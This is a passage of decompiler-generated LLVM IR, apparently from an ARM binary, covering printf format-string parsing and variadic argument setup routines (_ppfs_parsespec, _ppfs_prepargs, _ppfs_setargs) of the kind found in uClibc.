  store i32 8, i32* %v2_10a4c21, align 4
  %v3_10a4c22 = load i32, i32* %r2.global-to-local, align 4
  %v4_10a4c23 = add i32 %v3_10a4c22, 4
  store i32 %v4_10a4c23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10a48.dec_label_pc_10a48_crit_edge

dec_label_pc_10a48.dec_label_pc_10a48_crit_edge:  ; preds = %entry, %dec_label_pc_10a48.dec_label_pc_10a48_crit_edge
  %v4_10a4c24 = phi i32 [ %v4_10a4c23, %entry ], [ %v4_10a4c, %dec_label_pc_10a48.dec_label_pc_10a48_crit_edge ]
  %v0_10a48.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10a4c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10a48 = add i32 %v0_10a48.pre, -1
  store i32 %v1_10a48, i32* %r3.global-to-local, align 4
  %v7_10a48 = icmp eq i32 %v0_10a48.pre, 1
  %v2_10a4c = inttoptr i32 %v4_10a4c24 to i32*
  store i32 %v0_10a4c.pre, i32* %v2_10a4c, align 4
  %v3_10a4c = load i32, i32* %r2.global-to-local, align 4
  %v4_10a4c = add i32 %v3_10a4c, 4
  store i32 %v4_10a4c, i32* %r2.global-to-local, align 4
  br i1 %v7_10a48, label %dec_label_pc_10a54, label %dec_label_pc_10a48.dec_label_pc_10a48_crit_edge

dec_label_pc_10a54:                               ; preds = %dec_label_pc_10a48.dec_label_pc_10a48_crit_edge
  %v0_10a54 = load i32, i32* @r5, align 4
  store i32 %v0_10a54, i32* %r2.global-to-local, align 4
  %v1_10a942 = inttoptr i32 %v0_10a54 to i8*
  %v2_10a943 = load i8, i8* %v1_10a942, align 1
  %v3_10a944 = zext i8 %v2_10a943 to i32
  store i32 %v3_10a944, i32* %r0.global-to-local, align 4
  %v2_10a985 = icmp eq i8 %v2_10a943, 0
  br i1 %v2_10a985, label %dec_label_pc_10aa0, label %dec_label_pc_10a5c

dec_label_pc_10a5c:                               ; preds = %dec_label_pc_10a54, %dec_label_pc_10a94.backedge
  %v0_10a64 = phi i32 [ %storemerge, %dec_label_pc_10a94.backedge ], [ %v0_10a54, %dec_label_pc_10a54 ]
  %v0_10a5c = phi i32 [ %v3_10a94, %dec_label_pc_10a94.backedge ], [ %v3_10a944, %dec_label_pc_10a54 ]
  %v7_10a5c = icmp eq i32 %v0_10a5c, 37
  br i1 %v7_10a5c, label %dec_label_pc_10a64, label %dec_label_pc_10a90

dec_label_pc_10a64:                               ; preds = %dec_label_pc_10a5c
  %v1_10a64 = add i32 %v0_10a64, 1
  %v2_10a64 = inttoptr i32 %v1_10a64 to i8*
  %v3_10a64 = load i8, i8* %v2_10a64, align 1
  %v4_10a64 = zext i8 %v3_10a64 to i32
  store i32 %v4_10a64, i32* %r3.global-to-local, align 4
  store i32 %v1_10a64, i32* %r2.global-to-local, align 4
  %v7_10a68 = icmp eq i8 %v3_10a64, 37
  br i1 %v7_10a68, label %dec_label_pc_10a90, label %dec_label_pc_10a70

dec_label_pc_10a70:                               ; preds = %dec_label_pc_10a64
  %v1_10a70 = load i32, i32* @r4, align 4
  %v2_10a70 = inttoptr i32 %v1_10a70 to i32*
  store i32 %v1_10a64, i32* %v2_10a70, align 4
  %v0_10a74 = load i32, i32* @r4, align 4
  store i32 %v0_10a74, i32* %r0.global-to-local, align 4
  %v1_10a78 = inttoptr i32 %v0_10a74 to i8*
  %v2_10a78 = call i32 @_ppfs_parsespec(i8* %v1_10a78)
  store i32 %v2_10a78, i32* %r0.global-to-local, align 4
  %v1_10a7c = icmp slt i32 %v2_10a78, 0
  br i1 %v1_10a7c, label %dec_label_pc_10aa4.loopexit, label %dec_label_pc_10a88

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10a70
  %v0_10a88 = load i32, i32* @r4, align 4
  %v1_10a88 = inttoptr i32 %v0_10a88 to i32*
  %v2_10a88 = load i32, i32* %v1_10a88, align 4
  br label %dec_label_pc_10a94.backedge

dec_label_pc_10a90:                               ; preds = %dec_label_pc_10a5c, %dec_label_pc_10a64
  %v0_10a90 = phi i32 [ %v0_10a64, %dec_label_pc_10a5c ], [ %v1_10a64, %dec_label_pc_10a64 ]
  %v1_10a90 = add i32 %v0_10a90, 1
  br label %dec_label_pc_10a94.backedge

dec_label_pc_10a94.backedge:                      ; preds = %dec_label_pc_10a90, %dec_label_pc_10a88
  %storemerge = phi i32 [ %v1_10a90, %dec_label_pc_10a90 ], [ %v2_10a88, %dec_label_pc_10a88 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_10a94 = inttoptr i32 %storemerge to i8*
  %v2_10a94 = load i8, i8* %v1_10a94, align 1
  %v3_10a94 = zext i8 %v2_10a94 to i32
  store i32 %v3_10a94, i32* %r0.global-to-local, align 4
  %v2_10a98 = icmp eq i8 %v2_10a94, 0
  br i1 %v2_10a98, label %dec_label_pc_10a94.dec_label_pc_10aa0_crit_edge, label %dec_label_pc_10a5c

dec_label_pc_10a94.dec_label_pc_10aa0_crit_edge:  ; preds = %dec_label_pc_10a94.backedge
  %v0_10aa0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10aa0

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10a94.dec_label_pc_10aa0_crit_edge, %dec_label_pc_10a54
  %v0_10aa0 = phi i32 [ %v0_10aa0.pre, %dec_label_pc_10a94.dec_label_pc_10aa0_crit_edge ], [ %v0_10a54, %dec_label_pc_10a54 ]
  %v1_10aa0 = load i32, i32* @r4, align 4
  %v2_10aa0 = inttoptr i32 %v1_10aa0 to i32*
  store i32 %v0_10aa0, i32* %v2_10aa0, align 4
  %v1_10aac.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10aa4

dec_label_pc_10aa4.loopexit:                      ; preds = %dec_label_pc_10a70
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10aa4.loopexit, %dec_label_pc_10aa0
  %v1_10aac = phi i32 [ -1, %dec_label_pc_10aa4.loopexit ], [ %v1_10aac.pre, %dec_label_pc_10aa0 ]
  store i32 %v3_10a10, i32* @r4, align 4
  store i32 %v6_10a10, i32* @r5, align 4
  ret i32 %v1_10aac

; uselistorder directives
  uselistorder i32 %v3_10a94, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10a54, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10a4c, { 1, 0 }
  uselistorder i32 %v0_10a48.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_10a90, { 1, 0 }
  uselistorder label %dec_label_pc_10a5c, { 1, 0 }
  uselistorder label %dec_label_pc_10a48.dec_label_pc_10a48_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10ab0 = load i32, i32* @r4, align 4
  store i32 %v3_10ab0, i32* %stack_var_-12, align 4
  %v0_10ab4 = load i32, i32* @r0, align 4
  %v1_10ab4 = add i32 %v0_10ab4, 24
  %v2_10ab4 = inttoptr i32 %v1_10ab4 to i32*
  %v3_10ab4 = load i32, i32* %v2_10ab4, align 4
  store i32 %v3_10ab4, i32* %r5.global-to-local, align 4
  store i32 %v0_10ab4, i32* @r4, align 4
  %v2_10ac4 = add i32 %v0_10ab4, 76
  %v3_10ac4 = inttoptr i32 %v2_10ac4 to i32*
  store i32 %arg2, i32* %v3_10ac4, align 4
  %tmp5 = icmp slt i32 %v3_10ab4, 1
  br i1 %tmp5, label %dec_label_pc_10ae8, label %dec_label_pc_10acc

dec_label_pc_10acc:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10ad0 = load i32, i32* @r0, align 4
  %v2_10ad0 = add i32 %v1_10ad0, 8
  %v3_10ad0 = inttoptr i32 %v2_10ad0 to i32*
  store i32 0, i32* %v3_10ad0, align 4
  %v0_10ad4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10ad4 = load i32, i32* @r0, align 4
  %v2_10ad4 = add i32 %v1_10ad4, 28
  %v3_10ad4 = inttoptr i32 %v2_10ad4 to i32*
  store i32 %v0_10ad4, i32* %v3_10ad4, align 4
  %v0_10ad8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10ad8 = load i32, i32* @r0, align 4
  %v2_10ad8 = add i32 %v1_10ad8, 24
  %v3_10ad8 = inttoptr i32 %v2_10ad8 to i32*
  store i32 %v0_10ad8, i32* %v3_10ad8, align 4
  %v0_10adc = load i32, i32* %r3.global-to-local, align 4
  %v1_10adc = load i32, i32* @r0, align 4
  %v2_10adc = add i32 %v1_10adc, 4
  %v3_10adc = inttoptr i32 %v2_10adc to i32*
  store i32 %v0_10adc, i32* %v3_10adc, align 4
  %v0_10ae0 = call i32 @_ppfs_setargs()
  store i32 %v0_10ae0, i32* @r0, align 4
  %v0_10ae4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10ae4 = load i32, i32* @r4, align 4
  %v2_10ae4 = add i32 %v1_10ae4, 24
  %v3_10ae4 = inttoptr i32 %v2_10ae4 to i32*
  store i32 %v0_10ae4, i32* %v3_10ae4, align 4
  br label %dec_label_pc_10ae8

dec_label_pc_10ae8:                               ; preds = %entry, %dec_label_pc_10acc
  %v2_10aec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10aec, i32* @r4, align 4
  %v1_10af0 = load i32, i32* @r0, align 4
  ret i32 %v1_10af0

; uselistorder directives
  uselistorder i32 %v0_10ab4, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_10ae8, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_10af4 = load i32, i32* @r0, align 4
  %v1_10af4 = add i32 %v0_10af4, 24
  %v2_10af4 = inttoptr i32 %v1_10af4 to i32*
  %v3_10af4 = load i32, i32* %v2_10af4, align 4
  store i32 %v3_10af4, i32* %r1.global-to-local, align 4
  %v2_10af8 = icmp eq i32 %v3_10af4, 0
  %v3_10afc = load i32, i32* @r4, align 4
  store i32 %v3_10afc, i32* %stack_var_-8, align 4
  %v1_10b00 = add i32 %v0_10af4, 8
  %v2_10b00 = inttoptr i32 %v1_10b00 to i32*
  %v3_10b00 = load i32, i32* %v2_10b00, align 4
  store i32 %v3_10b00, i32* %r3.global-to-local, align 4
  %v6_10b08 = icmp eq i32 %v3_10b00, -2147483648
  br i1 %v2_10af8, label %dec_label_pc_10b08, label %dec_label_pc_10c40

dec_label_pc_10b08:                               ; preds = %entry
  br i1 %v6_10b08, label %dec_label_pc_10b10, label %dec_label_pc_10b28

dec_label_pc_10b10:                               ; preds = %dec_label_pc_10b08
  %v1_10b10 = add i32 %v0_10af4, 76
  %v2_10b10 = inttoptr i32 %v1_10b10 to i32*
  %v3_10b10 = load i32, i32* %v2_10b10, align 4
  store i32 %v3_10b10, i32* %r3.global-to-local, align 4
  %v1_10b14 = inttoptr i32 %v3_10b10 to i32*
  %v2_10b14 = load i32, i32* %v1_10b14, align 4
  store i32 %v2_10b14, i32* %r2.global-to-local, align 4
  %v1_10b18 = add i32 %v3_10b10, 4
  store i32 %v1_10b18, i32* %r3.global-to-local, align 4
  store i32 %v1_10b18, i32* %v2_10b10, align 4
  %v0_10b20 = load i32, i32* %r2.global-to-local, align 4
  %v1_10b20 = load i32, i32* @r0, align 4
  %v2_10b20 = add i32 %v1_10b20, 8
  %v3_10b20 = inttoptr i32 %v2_10b20 to i32*
  store i32 %v0_10b20, i32* %v3_10b20, align 4
  %v0_10b24 = load i32, i32* %r2.global-to-local, align 4
  %v1_10b24 = load i32, i32* @r0, align 4
  %v2_10b24 = add i32 %v1_10b24, 80
  %v3_10b24 = inttoptr i32 %v2_10b24 to i32*
  store i32 %v0_10b24, i32* %v3_10b24, align 4
  %v0_10b28.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10b28

dec_label_pc_10b28:                               ; preds = %dec_label_pc_10b08, %dec_label_pc_10b10
  %v1_10b44 = phi i32 [ %v0_10af4, %dec_label_pc_10b08 ], [ %v0_10b28.pre, %dec_label_pc_10b10 ]
  %v1_10b28 = add i32 %v1_10b44, 4
  %v2_10b28 = inttoptr i32 %v1_10b28 to i32*
  %v3_10b28 = load i32, i32* %v2_10b28, align 4
  store i32 %v3_10b28, i32* %r3.global-to-local, align 4
  %v6_10b2c = icmp eq i32 %v3_10b28, -2147483648
  %v1_10b30 = add i32 %v1_10b44, 80
  store i32 %v1_10b30, i32* %ip.global-to-local, align 4
  br i1 %v6_10b2c, label %dec_label_pc_10b38, label %dec_label_pc_10b50

dec_label_pc_10b38:                               ; preds = %dec_label_pc_10b28
  %v1_10b38 = add i32 %v1_10b44, 76
  %v2_10b38 = inttoptr i32 %v1_10b38 to i32*
  %v3_10b38 = load i32, i32* %v2_10b38, align 4
  store i32 %v3_10b38, i32* %r3.global-to-local, align 4
  %v1_10b3c = inttoptr i32 %v3_10b38 to i32*
  %v2_10b3c = load i32, i32* %v1_10b3c, align 4
  store i32 %v2_10b3c, i32* %r2.global-to-local, align 4
  %v1_10b40 = add i32 %v3_10b38, 4
  store i32 %v1_10b40, i32* %r3.global-to-local, align 4
  store i32 %v1_10b40, i32* %v2_10b38, align 4
  %v0_10b48 = load i32, i32* %r2.global-to-local, align 4
  %v1_10b48 = load i32, i32* @r0, align 4
  %v2_10b48 = add i32 %v1_10b48, 4
  %v3_10b48 = inttoptr i32 %v2_10b48 to i32*
  store i32 %v0_10b48, i32* %v3_10b48, align 4
  %v0_10b4c = load i32, i32* %r2.global-to-local, align 4
  %v1_10b4c = load i32, i32* @r0, align 4
  %v2_10b4c = add i32 %v1_10b4c, 80
  %v3_10b4c = inttoptr i32 %v2_10b4c to i32*
  store i32 %v0_10b4c, i32* %v3_10b4c, align 4
  %v0_10c3017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10b50

dec_label_pc_10b50:                               ; preds = %dec_label_pc_10b28, %dec_label_pc_10b38
  %v0_10c3017 = phi i32 [ %v1_10b44, %dec_label_pc_10b28 ], [ %v0_10c3017.pre, %dec_label_pc_10b38 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_10b54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10b54, i32* %lr.global-to-local, align 4
  %v1_10c3018 = add i32 %v0_10c3017, 28
  %v2_10c3019 = inttoptr i32 %v1_10c3018 to i32*
  %v3_10c3020 = load i32, i32* %v2_10c3019, align 4
  store i32 %v3_10c3020, i32* %r3.global-to-local, align 4
  %v5_10c3822 = icmp slt i32 %v0_10b54, %v3_10c3020
  br i1 %v5_10c3822, label %dec_label_pc_10b5c, label %dec_label_pc_10c3c.loopexit

dec_label_pc_10b5c:                               ; preds = %dec_label_pc_10b50, %dec_label_pc_10c30.backedge
  %v0_10c3024 = phi i32 [ %v0_10c30, %dec_label_pc_10c30.backedge ], [ %v0_10c3017, %dec_label_pc_10b50 ]
  %v0_10b6823 = phi i32 [ %v0_10b68.be, %dec_label_pc_10c30.backedge ], [ %v0_10b54, %dec_label_pc_10b50 ]
  %v4_10b5c = mul i32 %v0_10b6823, 4
  %v5_10b5c = add i32 %v4_10b5c, %v0_10c3024
  store i32 %v5_10b5c, i32* %r3.global-to-local, align 4
  %v1_10b60 = add i32 %v5_10b5c, 40
  %v2_10b60 = inttoptr i32 %v1_10b60 to i32*
  %v3_10b60 = load i32, i32* %v2_10b60, align 4
  store i32 %v3_10b60, i32* %r3.global-to-local, align 4
  %v7_10b64 = icmp eq i32 %v3_10b60, 8
  %v1_10b68 = add i32 %v0_10b6823, 1
  store i32 %v1_10b68, i32* %lr.global-to-local, align 4
  br i1 %v7_10b64, label %dec_label_pc_10c30.backedge, label %dec_label_pc_10b70

dec_label_pc_10b70:                               ; preds = %dec_label_pc_10b5c
  %v1_10b70 = add i32 %v0_10c3024, 76
  %v2_10b70 = inttoptr i32 %v1_10b70 to i32*
  %v3_10b70 = load i32, i32* %v2_10b70, align 4
  store i32 %v3_10b70, i32* %r1.global-to-local, align 4
  %v8_10b74 = icmp sgt i32 %v3_10b60, 8
  br i1 %v8_10b74, label %dec_label_pc_10b98, label %dec_label_pc_10b78

dec_label_pc_10b78:                               ; preds = %dec_label_pc_10b70
  %v7_10b78 = icmp eq i32 %v3_10b60, 2
  br i1 %v7_10b78, label %dec_label_pc_10be8, label %dec_label_pc_10b80

dec_label_pc_10b80:                               ; preds = %dec_label_pc_10b78
  %v8_10b80 = icmp sgt i32 %v3_10b60, 2
  br i1 %v8_10b80, label %dec_label_pc_10b90, label %dec_label_pc_10b84

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b80
  %v1_10b84 = icmp slt i32 %v3_10b60, 0
  br i1 %v1_10b84, label %dec_label_pc_10c1c, label %dec_label_pc_10be8

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b80
  %v7_10b90 = icmp eq i32 %v3_10b60, 7
  br i1 %v7_10b90, label %dec_label_pc_10bfc, label %dec_label_pc_10c1c

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10b70
  %v7_10b98 = icmp eq i32 %v3_10b60, 1024
  br i1 %v7_10b98, label %dec_label_pc_10be8, label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10b98
  %v8_10ba0 = icmp sgt i32 %v3_10b60, 1024
  br i1 %v8_10ba0, label %dec_label_pc_10bb8, label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %dec_label_pc_10ba0
  switch i32 %v3_10b60, label %dec_label_pc_10c1c [
    i32 256, label %dec_label_pc_10be8
    i32 512, label %dec_label_pc_10be8
  ]

dec_label_pc_10bb8:                               ; preds = %dec_label_pc_10ba0
  %v7_10bb8 = icmp eq i32 %v3_10b60, 2048
  br i1 %v7_10bb8, label %dec_label_pc_10bcc, label %dec_label_pc_10bc4

dec_label_pc_10bc4:                               ; preds = %dec_label_pc_10bb8
  %v1_10bc0 = load i32, i32* %r4.global-to-local, align 4
  %v9_10bc0 = icmp eq i32 %v3_10b60, %v1_10bc0
  br i1 %v9_10bc0, label %dec_label_pc_10bfc, label %dec_label_pc_10c1c

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bb8
  %v1_10bcc = add i32 %v3_10b70, 7
  %v1_10bd0 = and i32 %v1_10bcc, -8
  store i32 %v1_10bd0, i32* %r3.global-to-local, align 4
  %v1_10bd4 = inttoptr i32 %v1_10bd0 to i32*
  %v2_10bd4 = load i32, i32* %v1_10bd4, align 8
  store i32 %v2_10bd4, i32* %r1.global-to-local, align 4
  %v3_10bd4 = or i32 %v1_10bd0, 4
  %v4_10bd4 = inttoptr i32 %v3_10bd4 to i32*
  %v5_10bd4 = load i32, i32* %v4_10bd4, align 4
  store i32 %v5_10bd4, i32* %r2.global-to-local, align 4
  %v1_10bd8 = add i32 %v1_10bd0, 8
  store i32 %v1_10bd8, i32* %r3.global-to-local, align 4
  store i32 %v1_10bd8, i32* %v2_10b70, align 4
  %v0_10be0 = load i32, i32* %ip.global-to-local, align 4
  %v1_10be0 = inttoptr i32 %v0_10be0 to i32*
  %v2_10be0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10be0, i32* %v1_10be0, align 4
  %v3_10be0 = add i32 %v0_10be0, 4
  %v4_10be0 = inttoptr i32 %v3_10be0 to i32*
  %v5_10be0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10be0, i32* %v4_10be0, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10ba4, %dec_label_pc_10ba4, %dec_label_pc_10b84, %dec_label_pc_10b98, %dec_label_pc_10b78
  %v1_10be8 = inttoptr i32 %v3_10b70 to i32*
  %v2_10be8 = load i32, i32* %v1_10be8, align 4
  store i32 %v2_10be8, i32* %r2.global-to-local, align 4
  %v1_10bec = add i32 %v3_10b70, 4
  store i32 %v1_10bec, i32* %r3.global-to-local, align 4
  store i32 %v1_10bec, i32* %v2_10b70, align 4
  %v0_10bf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10bf4 = load i32, i32* %ip.global-to-local, align 4
  %v2_10bf4 = inttoptr i32 %v1_10bf4 to i32*
  store i32 %v0_10bf4, i32* %v2_10bf4, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10bfc:                               ; preds = %dec_label_pc_10b90, %dec_label_pc_10bc4
  %v3_10bfc = load i32, i32* %v2_10b70, align 4
  %v1_10c00 = add i32 %v3_10bfc, 7
  %v1_10c04 = and i32 %v1_10c00, -8
  store i32 %v1_10c04, i32* %r3.global-to-local, align 4
  %v1_10c08 = inttoptr i32 %v1_10c04 to i32*
  %v2_10c08 = load i32, i32* %v1_10c08, align 8
  store i32 %v2_10c08, i32* %r1.global-to-local, align 4
  %v3_10c08 = or i32 %v1_10c04, 4
  %v4_10c08 = inttoptr i32 %v3_10c08 to i32*
  %v5_10c08 = load i32, i32* %v4_10c08, align 4
  store i32 %v5_10c08, i32* %r2.global-to-local, align 4
  %v1_10c0c = add i32 %v1_10c04, 8
  store i32 %v1_10c0c, i32* %r3.global-to-local, align 4
  store i32 %v1_10c0c, i32* %v2_10b70, align 4
  %v0_10c14 = load i32, i32* %ip.global-to-local, align 4
  %v1_10c14 = inttoptr i32 %v0_10c14 to i32*
  %v2_10c14 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_10c14, i32* %v1_10c14, align 4
  %v3_10c14 = add i32 %v0_10c14, 4
  %v4_10c14 = inttoptr i32 %v3_10c14 to i32*
  %v5_10c14 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_10c14, i32* %v4_10c14, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10ba4, %dec_label_pc_10b90, %dec_label_pc_10b84, %dec_label_pc_10bc4
  %v1_10c1c = add i32 %v3_10b70, 4
  store i32 %v1_10c1c, i32* %r3.global-to-local, align 4
  store i32 %v1_10c1c, i32* %v2_10b70, align 4
  %v0_10c24 = load i32, i32* %r1.global-to-local, align 4
  %v1_10c24 = inttoptr i32 %v0_10c24 to i32*
  %v2_10c24 = load i32, i32* %v1_10c24, align 4
  store i32 %v2_10c24, i32* %r3.global-to-local, align 4
  %v1_10c28 = load i32, i32* %ip.global-to-local, align 4
  %v2_10c28 = inttoptr i32 %v1_10c28 to i32*
  store i32 %v2_10c24, i32* %v2_10c28, align 4
  br label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10bfc, %dec_label_pc_10be8, %dec_label_pc_10bcc, %dec_label_pc_10c1c
  %v0_10c2c = load i32, i32* %ip.global-to-local, align 4
  %v1_10c2c = add i32 %v0_10c2c, 8
  store i32 %v1_10c2c, i32* %ip.global-to-local, align 4
  %v0_10c34.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10c30.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c30.backedge

dec_label_pc_10c30.backedge:                      ; preds = %dec_label_pc_10c2c, %dec_label_pc_10b5c
  %v0_10c30 = phi i32 [ %v0_10c30.pre, %dec_label_pc_10c2c ], [ %v0_10c3024, %dec_label_pc_10b5c ]
  %v0_10b68.be = phi i32 [ %v0_10c34.pre.pre, %dec_label_pc_10c2c ], [ %v1_10b68, %dec_label_pc_10b5c ]
  %v1_10c30 = add i32 %v0_10c30, 28
  %v2_10c30 = inttoptr i32 %v1_10c30 to i32*
  %v3_10c30 = load i32, i32* %v2_10c30, align 4
  store i32 %v3_10c30, i32* %r3.global-to-local, align 4
  %v5_10c38 = icmp slt i32 %v0_10b68.be, %v3_10c30
  br i1 %v5_10c38, label %dec_label_pc_10b5c, label %dec_label_pc_10c30.dec_label_pc_10c3c.loopexit_crit_edge

dec_label_pc_10c40:                               ; preds = %entry
  br i1 %v6_10b08, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10c40
  %v2_10c44 = add i32 %v0_10af4, 36
  %v3_10c44 = inttoptr i32 %v2_10c44 to i8*
  %v4_10c44 = load i8, i8* %v3_10c44, align 1
  %v5_10c44 = zext i8 %v4_10c44 to i32
  %v5_10c48 = mul nuw nsw i32 %v5_10c44, 8
  %v6_10c48 = add i32 %v5_10c48, %v0_10af4
  store i32 %v6_10c48, i32* %r3.global-to-local, align 4
  %v2_10c4c = add i32 %v6_10c48, 72
  %v3_10c4c = inttoptr i32 %v2_10c4c to i32*
  %v4_10c4c = load i32, i32* %v3_10c4c, align 4
  store i32 %v4_10c4c, i32* %r3.global-to-local, align 4
  store i32 %v4_10c4c, i32* %v2_10b00, align 4
  %v0_10c54.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10c40, %bb
  %v2_10c68 = phi i32 [ %v0_10c54.pre, %bb ], [ %v0_10af4, %dec_label_pc_10c40 ]
  %v1_10c54 = add i32 %v2_10c68, 4
  %v2_10c54 = inttoptr i32 %v1_10c54 to i32*
  %v3_10c54 = load i32, i32* %v2_10c54, align 4
  store i32 %v3_10c54, i32* %r3.global-to-local, align 4
  %v6_10c58 = icmp eq i32 %v3_10c54, -2147483648
  br i1 %v6_10c58, label %bb16, label %dec_label_pc_10c3c

bb16:                                             ; preds = %.thread1
  %v2_10c5c = add i32 %v2_10c68, 37
  %v3_10c5c = inttoptr i32 %v2_10c5c to i8*
  %v4_10c5c = load i8, i8* %v3_10c5c, align 1
  %v5_10c5c = zext i8 %v4_10c5c to i32
  %v5_10c60 = mul nuw nsw i32 %v5_10c5c, 8
  %v6_10c60 = add i32 %v5_10c60, %v2_10c68
  store i32 %v6_10c60, i32* %r3.global-to-local, align 4
  %v2_10c64 = add i32 %v6_10c60, 72
  %v3_10c64 = inttoptr i32 %v2_10c64 to i32*
  %v4_10c64 = load i32, i32* %v3_10c64, align 4
  store i32 %v4_10c64, i32* %r3.global-to-local, align 4
  store i32 %v4_10c64, i32* %v2_10c54, align 4
  %v0_10c6c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c3c

dec_label_pc_10c30.dec_label_pc_10c3c.loopexit_crit_edge: ; preds = %dec_label_pc_10c30.backedge
  br label %dec_label_pc_10c3c.loopexit

dec_label_pc_10c3c.loopexit:                      ; preds = %dec_label_pc_10c30.dec_label_pc_10c3c.loopexit_crit_edge, %dec_label_pc_10b50
  %v0_10c30.lcssa = phi i32 [ %v0_10c30, %dec_label_pc_10c30.dec_label_pc_10c3c.loopexit_crit_edge ], [ %v0_10c3017, %dec_label_pc_10b50 ]
  br label %dec_label_pc_10c3c

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10c3c.loopexit, %.thread1, %bb16
  %v1_10c8c = phi i32 [ %v0_10c30.lcssa, %dec_label_pc_10c3c.loopexit ], [ %v2_10c68, %.thread1 ], [ %v0_10c6c.pre, %bb16 ]
  %v1_10c6c = add i32 %v1_10c8c, 8
  %v2_10c6c = inttoptr i32 %v1_10c6c to i32*
  %v3_10c6c = load i32, i32* %v2_10c6c, align 4
  store i32 %v3_10c6c, i32* %r1.global-to-local, align 4
  %v1_10c70 = icmp slt i32 %v3_10c6c, 0
  br i1 %v1_10c70, label %dec_label_pc_10c78, label %dec_label_pc_10c98

dec_label_pc_10c78:                               ; preds = %dec_label_pc_10c3c
  %v1_10c78 = add i32 %v1_10c8c, 16
  %v2_10c78 = inttoptr i32 %v1_10c78 to i32*
  %v3_10c78 = load i32, i32* %v2_10c78, align 4
  %v1_10c80 = sub i32 0, %v3_10c6c
  store i32 %v1_10c80, i32* %r1.global-to-local, align 4
  %v1_10c7c = and i32 %v3_10c78, -10
  %v1_10c84 = or i32 %v1_10c7c, 8
  store i32 %v1_10c84, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_10c8c = add i32 %v1_10c8c, 20
  %v3_10c8c = inttoptr i32 %v2_10c8c to i32*
  store i32 32, i32* %v3_10c8c, align 4
  %v0_10c90 = load i32, i32* %r1.global-to-local, align 4
  %v1_10c90 = load i32, i32* @r0, align 4
  %v2_10c90 = add i32 %v1_10c90, 8
  %v3_10c90 = inttoptr i32 %v2_10c90 to i32*
  store i32 %v0_10c90, i32* %v3_10c90, align 4
  %v0_10c94 = load i32, i32* %r3.global-to-local, align 4
  %v1_10c94 = load i32, i32* @r0, align 4
  %v2_10c94 = add i32 %v1_10c94, 16
  %v3_10c94 = inttoptr i32 %v2_10c94 to i32*
  store i32 %v0_10c94, i32* %v3_10c94, align 4
  %v1_10c9c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10c3c, %dec_label_pc_10c78
  %v1_10c9c = phi i32 [ %v1_10c8c, %dec_label_pc_10c3c ], [ %v1_10c9c.pre, %dec_label_pc_10c78 ]
  %v2_10c98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10c98, i32* @r4, align 4
  ret i32 %v1_10c9c

; uselistorder directives
  uselistorder i32 %v2_10c68, { 1, 0, 2, 3 }
